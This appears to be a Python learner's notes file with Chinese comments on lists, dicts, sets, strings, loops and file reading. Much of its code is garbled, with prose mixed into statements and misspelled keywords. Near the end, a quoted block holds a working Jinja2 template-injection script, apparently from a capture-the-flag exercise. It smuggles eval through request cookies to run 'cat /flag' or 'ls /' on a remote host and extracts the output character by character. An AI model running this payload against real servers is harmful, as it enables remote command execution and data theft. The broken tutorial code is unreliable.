'''
list = [1,3,2,4,5,6,7,8,9]    # 列表是序列 支持切片和索引 可以储存任何对象 定义[]
print (list)
list.append(22)  对列表数据进行追加，且只能追加在末尾
print (list)
list.reverse()                    #id()可以输出存放变量的地址 python区分大小写 变量由字母，下划线，数字组成，只能由字母和下划线开头
print (list)
list.sort()
print(list)
list.insert(9,123)            根据索引确定插入位置，如果超出范围，就放在最后
print(list)
list.pop(3)根据索引删除数据 ，返回值是索引所对应删除的数据
# list.extend()    可以添加多个数据（指的是可迭代的对象） 只能追加在末尾
# list.remove(3.14)      根据值去删除
 list.count(1) 统计元素出现次数
 list[2:]     支持切片
print(list)
my_list1 = [1, 2, 3]
my_list2 = ["A", "B", "C"]
("原始列表1：", my_list1)
print("原始列表2：", my_list2)
#求列表长度
ln = len(my_list1)
print("求列表长度：", ln)
# 合并两个列表
my_list3 = my_list1 + my_list2
print("合并两个列表：", my_list3)
# 重复列表元素
my_list4 = my_list1 * 3
#print("重复列表元素：", my_list4)
# 判断元素是否在列表内
ex1 = 3 in my_list1
ex2 = 3 in my_list2
#print("判断元素是否在列表内：", ex1, ex2)
#对列表进行遍历
for x in my_list1:
    print("对列表进行遍历：", x)
                            #len()：求列表中元素的个数。
                            #+：合并两个列表。
                            #*：重复列表元素。
                            #in：判断元素是否在列表内。
                            #for：对列表进行遍历。
#元组的主要特点是它的元素是不可变的，这意味着一旦元组被创建，其内容就不能被添加、删除或修改。每个元素都有一个固定的索引位置，访问和遍历操作与列表相似。
#字典是{}定义的，必须有键值对，键不能重复，不能修改，值可以 当键重复的时候，以最后的元素为准
dict.pop（） 根据键移除数据，有返回值  del dict["k2"] 与前面等效
dict.popitem() 从后往前一处数据，一次只能移除一个
dict.update({"k3":"v3","k4":v4}) 可以控制插入变量的数量，把数据添加到末尾
dict.items()  把字典里所有的数据依次遍历，键值以元组的形式返回
dict.keys() 遍历键 dict.values() 遍历值
字典不是序列，不支持切片和索引
元组是稳固版的列表（代表里面的数据是不能被修改的）支持切片和索引 （）定义
 tup = (1,) 如果元组只有一个数据，需要在后面加上逗号
 tup.count() 统计元素出现次数   以上基本都需要在print（）中输出
 tup.index() 输出元素所在的索引值
 集合理解为没有值的字典，不是序列，不支持切片和索引，可以删除增加元素 {} 不重复 无序
set = {1} 不包含数据会被认为字典 需要一个数据
如果出现重复的会去重  可以强制转换类型
set.discard("q1") 删除指定元素
set.add("add") 没有插入顺序 随机出现在某个位置
 sorted函数按照长短大小，英文字母的顺序，给列表中的元素进行排序，sorted函数并不会改变对象本身
print(sorted（list）) 正向
print(sorted(list,reverse=ture)) 反向
print(sorted(list,key=lambda x:-x))
lambda 表达式相当于没有名字的函数，优点是让代码更简洁
key=lanbda x:-X   与以下函数相同
def test(x):
    return -x
for item in list:
    print(test(item))
列表推导式 运算的时间会少
正常生成列表    import time 导入时间模块
#start = time.perf_counter() 返回计算机系统的时间
a = []
for  i in range (10):
     a.append(i)
     pass
#end = time.perf_counter()
print(end-start)
print (a)
打开文件
import re 导入正则模块 匹配标点符号
path = “文件路径” 文件反斜杠写成正斜杠 or 在前面引号加上一个r
with open（path，“r”） as file：
     file = re.sub(r"[,/\;%&]"+","",file.read()) 把标点符号替换成空格
     把空格或者换行分割字符串，保存为一个列表
     words =[word.lower() for word in file.split()]  split() 默认以空格和换行分割的
     去重
     new_words= set(words)
     生成字典 方便单词储存及其出现的次数，字典推导式
     dict_word = (i:words.cont(i) for i in new_words)
     for item in sorted(dict_word,reverse=true) :
       print(f"{item}出现了{dict_word[item]}次")
     print（words）
     #print(file)

a= [i for i in range(10)]
1.打开文件利用：file=open（‘地址’（此处要把地址右斜杠改成左斜杠），打开格式‘w/r/a’） file.write() file.close()
# w会覆盖原来的数据 a是对原来文件进行追加
# 2.with..as.. with open （’文件地址‘，‘w/r/a’） as file
#  file.write()
#  pass 代表代码结束(不重要)
#字符串 单引号,双引号,三引号(单引号*3) print(a,end=',')代表输出并最后加,
# 1.*相乘 2.*倍数
# name ='zhangsan'
# print('name:%s'%(name*3)) 输出三次name的内容   s字符串 d整形 f浮点型
# 字符串还支持切片和索引       语法 [start:end:step] step:步长,默认是1
# print(name[2]) 结果:a 正向索引->
# print(name[-3])结果:s 反向索引<-
# 正向切片  print(name[2:4]) 结果:an 切片不包含end位置的字符
# print(name[2:4:2]) 结果:a
# print(name[2:])   输出下标为2后面的所有的数据 结果:angsan
# print(name[:5])   输出下标为5前面的所有数据(不包含5) 结果:张
# 反向切片 print(name[-3:-1])  从前往后 不包含-1 结果:sa
# print(name[::-1])  取反 逆序输出
#   1. capitalize() #首字母变人写
# 2. endswith/startswith() #是否x结束/开始
# 3. find(x) #检测x是否在字符串中
# 4. isalnum() #判断是否是字母和数字
# 5. isalpha() #判断是否是字母
# 6. isdigit() #判断是否是数字e.g. "qwe123" .isdigit()
# 7 islower() #判断是否是小写
# 8. join() #循环取出所有值用xx去连接e.g. xx.join(seq)
# 9. lower/upper #大小写转换
# 10. swapcase #人写变小写，小写变大写
# 11，lstrip/rstrip/strip #移除左右两侧空百
# 12. split( #切割字符串
# 13. title() #把每个单词的首字母变成大写
# 14.replace(old, new, [max]) #把字符串中的old (旧字符串)替 换成new(新字符串)，如果指定第三个参数max,则替换不超过max次。
# 15，count( )#统计出现的次数
# 当需要处理多个填空时,,可以使用format()来批处理 format()里的个数取决于空的个数
# 也可以通过给空里的变量赋值来 处理空  print('{},23456{}',format{a,b}) a=1 b=7'''''''''
import random

# for 元素 in （集合） 概括是于其中的每一个元素，做什么事情
#range（）生成一个数据集合列表 range（起始；结束：步长） 步长不能为零 只能整数集合 range默认起始值为0 区间为左闭右开
# 正序输出
#for i in range(1,10,1):
#    print (i)
#反序输出
#for i in range(9，0,-1)
#      print (i)
#
# 能生产布尔值的式子叫做布尔表达式
# 比较运算符里需要注意的是 >= <=  1>=2 等价于 1>2 or 1==2
# 布尔运算符的优先级 ()>not > or > and
#  while() 容易死循环，建议在不确定循环次数时候使用 1.有初始值 2.有条件表达式（一般为布尔表达式） 3.循环体内变量自增自减   否则死循环
#  异常处理可以使用 try/except语句
#  try ；执行代码
#  except ：发生异常执行的代码
# try ：
#     a = （“请输入一个整数”）
# except ValueError as msg ：
#     print （“请输入整数”）
#
#     Exception(能够捕获到比较常见的异常)--->  在except后面
#  finally 后面是一定会执行的命令
'''i=0
while i<=100 :
    if (i % 2 == 0):
        print(i)
    i += 1'''
#import os
#os.file('test.txt')
#import random
#a = random.randint(0,100)
#x = 0
#while( x != a):
 # x = int(input("请输入一个数字："))

  #if x > a :
   # print('猜大了')
  #elif x < a :
  #  print('猜小了')
 # elif x == a :
   # print('猜对了，是%d' %x)
'''for i in range(1,10):
    for j in range(1,10):
        print('%d * %d = %d'%(i,j,i * j),end = '\t')
        print()'''
'''import requests
#url='https://www.douban.com/'
response = requests.get('https://www.douban.com/')
print(response.content.decode('utf-8'))'''

#使用 os.stat('file_name').st_size() function 获取文件大小。如果为 0，则文件为空。
#
## -*- coding: utf-8 -*-
# @Time     : 2024/12/15 12:10

'''import requests
import os



url = "http://8.147.135.93:30739/"
url = "http://127.0.0.1:5000"

# i = 0
# j = 'b'
# data = {
#    "code" : "{%set a=(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4)['ev'+'al'](request.cookies.x5)%}{% if a[" + str(i) + "]!='"+j+"' %}{{ (x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4)['ev'+'al'](request.cookies.x6) }}{% endif %}"
# }
# cookie = {
#     "x1":"__init__",
#     "x2":"__globals__",
#     "x3":"__getitem__",
#     "x4":"__builtins__",
#     "x5":"__import__('os').popen('ls /').read()",
#     "x6":"__import__('os').qwerasdf()" # 不存在的函数
# }# "x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('dir').read()"
# res = requests.post(url, data=data, cookies=cookie)
# print(res.content)

# flag = ''
out_put = ''
for i in range(0, 100):
    for j in "\x20abcdefghijklmnopqrstuvwxyz0123456789-{}\x20":
        data = {
            "code": "{%set a=(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4)['ev'+'al'](request.cookies.x5)%}{% if a[" + str(
                i) + "]!='" + j + "' %}{{ (x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4)['ev'+'al'](request.cookies.x6) }}{% endif %}"
        }

        cookie = {
            "x1": "__init__",
            "x2": "__globals__",
            "x3": "__getitem__",
            "x4": "__builtins__",
            "x5": "__import__('os').popen('cat /flag').read()",
            "x6": "__import__('os').qwer()"
        }
        r = requests.post(url, data=data, cookies=cookie)
        if "ok" in r.text:
            out_put += j
            print(out_put)
            break


#
#
#
#
#
#
#
#
#
#
#
#
#

#
#
#
#
#
#
'''
'''import requests
import re
import time
def pc (url,headers):
    url=input("请输入你选择要爬取的网址")
    headers=input("请输入你的UA")
    r = requests.get(url,headers)
    if (r.status_code == 200) :
        print(r.content.decode('utf-8'))
    else :
        print(r.status_code)
    time.sleep(random.random() * 4 + 1)
pc(url,headers) '''

